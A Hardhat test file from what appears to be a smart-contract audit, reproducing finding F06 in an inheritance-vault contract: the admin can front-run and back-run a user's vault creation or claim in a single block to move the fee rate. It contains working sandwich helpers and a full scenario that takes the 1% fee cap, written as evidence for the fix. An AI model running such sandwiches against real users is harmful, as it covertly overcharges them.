// v1 evidence suite (audit/2026-09-preliminary). Ported from the audit PoC sandbox poc/F06/test/poc-F06.ts.
// Contract under test: contracts/v1/InheritanceVaultV1.sol (the deployed v1 source, renamed). See ../README.md.
/**
 * PoC for F06: the fee ceiling (createVault) and the fee lock (initiateClaim) are both taken
 * from a global rate that the admin can move in the same block as the user's transaction, and
 * neither call accepts a user-supplied bound. A-04 locked the rate at initiateClaim, but that
 * only turns a one-point settlement sandwich into a two-point sandwich.
 *
 * Every test asserts the INTENDED property: a user never pays more than the rate that was
 * public (claimFeeBps() at the last mined block) when they signed. They fail against the
 * current code because of the defect. They are written to pass unchanged after either
 * recommended fix:
 *   (a) a uint16 maxFeeBps appended to createVault / initiateClaim: detected from the ABI and
 *       passed as the quoted rate, and a user tx that reverts on the bound counts as safe;
 *   (b) timelocked fee increases: the front-run setClaimFee(higher) does not take effect.
 *
 * The ordering is real: automine is off, the admin's front-run carries a higher priority fee
 * than the user's transaction, and Hardhat's default "priority" mempool order places it
 * first. The block's transaction order is asserted as a setup check.
 */
import { expect } from "chai";
import hre, { ethers, network } from "hardhat";
import { loadFixture, time } from "@nomicfoundation/hardhat-network-helpers";

const DAY = 86_400;
const PERIOD = 30 * DAY;
const WINDOW = 14 * DAY;
const NATIVE = ethers.ZeroAddress;
const DEPOSIT = ethers.parseEther("10");
const ADVERTISED = 50; // what the site quotes when Alice creates her vault
const PROMO = 10; // a later public promotion
const CAP = 100; // MAX_CLAIM_FEE_BPS

const GWEI = 1_000_000_000n;
const GAS = 600_000n;
// Tips: the searcher (admin) outbids the user; its back-run is nonce+1 so it lands after.
const FRONT = { gasLimit: GAS, maxFeePerGas: 200n * GWEI, maxPriorityFeePerGas: 100n * GWEI };
const USER = { gasLimit: GAS, maxFeePerGas: 200n * GWEI, maxPriorityFeePerGas: 2n * GWEI };
const BACK = { gasLimit: GAS, maxFeePerGas: 200n * GWEI, maxPriorityFeePerGas: 1n * GWEI };

// Evidence-suite port: pinned to v1. The sandbox's F06_VAULT switch (fix sketches F06FixBound and
// F06FixTimelock) is not carried over; the v2 regression tests replace it.
const VAULT_NAME = "InheritanceVaultV1";
const VAULT_FQ = "contracts/v1/InheritanceVaultV1.sol:InheritanceVaultV1";

describe(`F06 fee ceiling and fee lock are front-runnable (no user-supplied bound) [${VAULT_NAME}]`, () => {
  // Evidence-suite port: start from a fresh chain, as this PoC did alone in its audit sandbox. In the
  // combined audit:v1 run, earlier files leave state behind (nonces, balances, deployments, block time).
  before(async () => {
    await (await import("@nomicfoundation/hardhat-network-helpers")).reset();
  });

  async function fixture() {
    const [admin, alice, bob, carol, feeSink] = await ethers.getSigners();
    const Vault = await ethers.getContractFactory(VAULT_FQ, admin);
    const vault = await Vault.deploy(admin.address, ADVERTISED, feeSink.address);
    return { vault, admin, alice, bob, carol, feeSink };
  }

  afterEach(async () => {
    await network.provider.send("evm_setAutomine", [true]);
  });

  // ------------------------------------------------------------------ helpers

  /** The overload with one extra (bound) argument, if a fixed version adds one. */
  function boundedSig(vault: any, name: string, baseArity: number): string | null {
    const frag = vault.interface.fragments.find(
      (f: any) => f.type === "function" && f.name === name && f.inputs.length === baseArity + 1
    );
    return frag ? frag.format("sighash") : null;
  }

  async function sendCreate(f: any, quotedBps: number, overrides: any) {
    const horizon = (await time.latest()) + 730 * DAY;
    const args = [NATIVE, DEPOSIT, f.bob.address, PERIOD, WINDOW, horizon];
    const sig = boundedSig(f.vault, "createVault", 6);
    const fn = f.vault.connect(f.alice).getFunction(sig ?? "createVault");
    return sig
      ? fn(...args, quotedBps, { value: DEPOSIT, ...overrides })
      : fn(...args, { value: DEPOSIT, ...overrides });
  }

  async function sendInitiate(f: any, quotedBps: number, overrides: any) {
    const args = [f.alice.address, 0, f.bob.address];
    const sig = boundedSig(f.vault, "initiateClaim", 3);
    const fn = f.vault.connect(f.bob).getFunction(sig ?? "initiateClaim");
    return sig ? fn(...args, quotedBps, overrides) : fn(...args, overrides);
  }

  async function mineBlock() {
    await network.provider.send("evm_mine", []);
    return await ethers.provider.getBlock("latest");
  }

  async function status(tx: any): Promise<number> {
    const r = await ethers.provider.getTransactionReceipt(tx.hash);
    return r!.status!;
  }

  /** Mines [front-run, victim, back-run] in ONE block, ordered by priority fee. */
  async function sandwich(f: any, frontBps: number, sendVictim: () => Promise<any>, backBps: number) {
    await network.provider.send("evm_setAutomine", [false]);
    const victim = await sendVictim(); // the user signs first, at the public rate...
    const front = await f.vault.connect(f.admin).setClaimFee(frontBps, FRONT); // ...searcher sees it
    const back = await f.vault.connect(f.admin).setClaimFee(backBps, BACK);
    const block = await mineBlock();
    await network.provider.send("evm_setAutomine", [true]);
    // Setup check: the ordering really is front-run, victim, back-run in a single block.
    expect(block!.transactions).to.deep.equal([front.hash, victim.hash, back.hash]);
    expect(await status(front)).to.equal(1);
    expect(await status(back)).to.equal(1);
    return { victim, block };
  }

  /** Reads Vault.lockedFeeBps straight from storage: getVault() does not expose it. */
  async function lockedFeeBps(vault: any, owner: string, vaultId: number): Promise<number> {
    const [file, name] = VAULT_FQ.split(":");
    const info = await hre.artifacts.getBuildInfo(VAULT_FQ);
    const layout = (info!.output.contracts[file][name] as any).storageLayout;
    const vaultsVar = layout.storage.find((s: any) => s.label === "_vaults");
    const inner = layout.types[vaultsVar.type].value; // mapping(uint256 => Vault)
    const structType = layout.types[inner].value;
    const member = layout.types[structType].members.find((m: any) => m.label === "lockedFeeBps");
    const coder = ethers.AbiCoder.defaultAbiCoder();
    const outer = ethers.keccak256(coder.encode(["address", "uint256"], [owner, BigInt(vaultsVar.slot)]));
    const base = BigInt(ethers.keccak256(coder.encode(["uint256", "bytes32"], [vaultId, outer])));
    const word = BigInt(await ethers.provider.getStorage(await vault.getAddress(), base + BigInt(member.slot)));
    return Number((word >> BigInt(member.offset * 8)) & 0xffffn);
  }

  // ------------------------------------------------------------------ creation leg (OQ-3)

  it("createVault: the ceiling snapshotted for Alice cannot exceed the rate she was quoted", async () => {
    const f = await loadFixture(fixture);
    const quoted = Number(await f.vault.claimFeeBps()); // what the site shows her: 50
    expect(quoted).to.equal(ADVERTISED);

    const { victim } = await sandwich(f, CAP, () => sendCreate(f, quoted, USER), ADVERTISED);

    // The public rate never moved between blocks: 50 before, 50 after.
    expect(await f.vault.claimFeeBps()).to.equal(ADVERTISED);

    if ((await status(victim)) === 1) {
      const ceiling = Number((await f.vault.getVault(f.alice.address, 0)).feeBps);
      // INTENDED: the permanent per-vault ceiling is at most the quoted rate.
      // DEFECT: it is 100 (the 1% bytecode cap), set by a same-block front-run.
      expect(ceiling, "vault fee ceiling vs the rate Alice was quoted").to.be.lte(quoted);
    }
  });

  // ------------------------------------------------------------------ claim leg (A-04 remnant)

  it("initiateClaim + finalizeClaim: the heir pays at most the rate public when he claimed (two-point sandwich)", async () => {
    const f = await loadFixture(fixture);
    // Honest creation at the advertised 50 bps ceiling.
    await (await sendCreate(f, Number(await f.vault.claimFeeBps()), {})).wait(); // honest creation
    expect((await f.vault.getVault(f.alice.address, 0)).feeBps).to.equal(ADVERTISED);

    await f.vault.connect(f.admin).setClaimFee(PROMO); // public promotion: 0.1%
    await time.increase(PERIOD + 1); // Alice is gone; the deadline has passed

    const quoted = Number(await f.vault.claimFeeBps()); // what Bob sees: 10
    expect(quoted).to.equal(PROMO);

    // Leg 1: sandwich Bob's initiateClaim so the lock captures the ceiling.
    const { victim, block } = await sandwich(f, ADVERTISED, () => sendInitiate(f, quoted, USER), PROMO);
    expect(await f.vault.claimFeeBps()).to.equal(PROMO); // public rate reads 10 again
    const initiated = (await status(victim)) === 1;

    if (initiated) {
      // Leg 2: at finalizableAt the admin raises, finalizes itself, and lowers, in one block.
      await time.setNextBlockTimestamp(block!.timestamp + WINDOW);
      await network.provider.send("evm_setAutomine", [false]);
      await f.vault.connect(f.admin).setClaimFee(ADVERTISED, FRONT);
      const fin = await f.vault.connect(f.admin).finalizeClaim(f.alice.address, 0, FRONT);
      await f.vault.connect(f.admin).setClaimFee(PROMO, FRONT);
      await mineBlock();
      await network.provider.send("evm_setAutomine", [true]);
      expect(await status(fin)).to.equal(1);
      expect(await f.vault.claimFeeBps()).to.equal(PROMO); // reads 10 before and after

      const receipt = await ethers.provider.getTransactionReceipt(fin.hash);
      const settled = receipt!.logs
        .map((l) => f.vault.interface.parseLog(l))
        .find((e: any) => e && e.name === "ClaimSettled");
      const fee: bigint = settled!.args.fee;
      const maxFair = (DEPOSIT * BigInt(quoted)) / 10_000n; // 0.01 ETH at 10 bps

      // INTENDED (the A-04 promise): no fee above the rate Bob had every public reason to expect.
      // DEFECT: fee is 0.05 ETH (50 bps), five times the rate public at every block boundary.
      expect(fee, "settlement fee vs the rate public when Bob claimed").to.be.lte(maxFair);
    }
  });

  it("the heir cannot escape the finalize leg on a public mempool: his own finalizeClaim is front-run too", async () => {
    const f = await loadFixture(fixture);
    await (await sendCreate(f, Number(await f.vault.claimFeeBps()), {})).wait(); // honest creation
    await f.vault.connect(f.admin).setClaimFee(PROMO);
    await time.increase(PERIOD + 1);
    const quoted = Number(await f.vault.claimFeeBps());

    const { victim, block } = await sandwich(f, ADVERTISED, () => sendInitiate(f, quoted, USER), PROMO);
    if ((await status(victim)) === 1) {
      await time.setNextBlockTimestamp(block!.timestamp + WINDOW);
      // Bob finalizes himself at exactly finalizableAt, as the heir guide would advise.
      const { victim: fin } = await sandwich(
        f,
        ADVERTISED,
        () => f.vault.connect(f.bob).finalizeClaim(f.alice.address, 0, USER),
        PROMO
      );
      expect(await status(fin)).to.equal(1);
      const settled = (await ethers.provider.getTransactionReceipt(fin.hash))!.logs
        .map((l) => f.vault.interface.parseLog(l))
        .find((e: any) => e && e.name === "ClaimSettled");
      const maxFair = (DEPOSIT * BigInt(quoted)) / 10_000n;
      expect(settled!.args.fee, "fee when the heir finalizes himself").to.be.lte(maxFair);
    }
  });

  // ------------------------------------------------------------------ damage, full scenario

  it("quantified: creation front-run + two-point claim sandwich takes the 1% cap while the public rate never exceeded 0.5%", async () => {
    const f = await loadFixture(fixture);
    const publicRates: number[] = [];
    const sample = async () => publicRates.push(Number(await f.vault.claimFeeBps()));

    await sample();
    const quotedAtCreate = Number(await f.vault.claimFeeBps()); // 50
    // Creation leg: Alice's vault gets a 100 bps ceiling.
    const c = await sandwich(f, CAP, () => sendCreate(f, quotedAtCreate, USER), ADVERTISED);
    await sample();
    const created = (await status(c.victim)) === 1;

    await f.vault.connect(f.admin).setClaimFee(PROMO);
    await sample();
    await time.increase(PERIOD + 1);
    await sample();

    let fee = 0n;
    let locked = -1;
    if (created) {
      const quoted = Number(await f.vault.claimFeeBps()); // 10
      const i = await sandwich(f, CAP, () => sendInitiate(f, quoted, USER), PROMO);
      await sample();
      if ((await status(i.victim)) === 1) {
        locked = await lockedFeeBps(f.vault, f.alice.address, 0);
        await time.setNextBlockTimestamp(i.block!.timestamp + WINDOW);
        await network.provider.send("evm_setAutomine", [false]);
        await f.vault.connect(f.admin).setClaimFee(CAP, FRONT);
        const fin = await f.vault.connect(f.admin).finalizeClaim(f.alice.address, 0, FRONT);
        await f.vault.connect(f.admin).setClaimFee(PROMO, FRONT);
        await mineBlock();
        await network.provider.send("evm_setAutomine", [true]);
        await sample();
        const settled = (await ethers.provider.getTransactionReceipt(fin.hash))!.logs
          .map((l) => f.vault.interface.parseLog(l))
          .find((e: any) => e && e.name === "ClaimSettled");
        fee = settled!.args.fee;
      }
    }

    const maxPublic = Math.max(...publicRates);
    const ceiling = created ? Number((await f.vault.getVault(f.alice.address, 0)).feeBps) : 0;
    const feeSinkCredit = await f.vault.creditOf(NATIVE, f.feeSink.address);
    const bobCredit = await f.vault.creditOf(NATIVE, f.bob.address);
    const atAdvertised = (DEPOSIT * BigInt(PROMO)) / 10_000n;
    console.log(
      `      claimFeeBps() at every block boundary: [${publicRates.join(", ")}] (max ${maxPublic})\n` +
        `      vault ceiling (getVault.feeBps): ${ceiling}; lockedFeeBps (storage only, not in getVault): ${locked}\n` +
        `      fee taken: ${ethers.formatEther(fee)} ETH; at the rate public when Bob claimed (${PROMO} bps): ` +
        `${ethers.formatEther(atAdvertised)} ETH; excess ${ethers.formatEther(fee - atAdvertised)} ETH\n` +
        `      credits: feeSink ${ethers.formatEther(feeSinkCredit)} ETH, heir ${ethers.formatEther(bobCredit)} ETH`
    );

    // INTENDED: the fee never exceeds the highest rate claimFeeBps() ever showed between blocks.
    // DEFECT: fee = 100 bps of 10 ETH = 0.1 ETH while the public rate was never above 50 bps.
    expect(fee, "fee vs the max public rate over the vault's life").to.be.lte(
      (DEPOSIT * BigInt(maxPublic)) / 10_000n
    );
  });
});
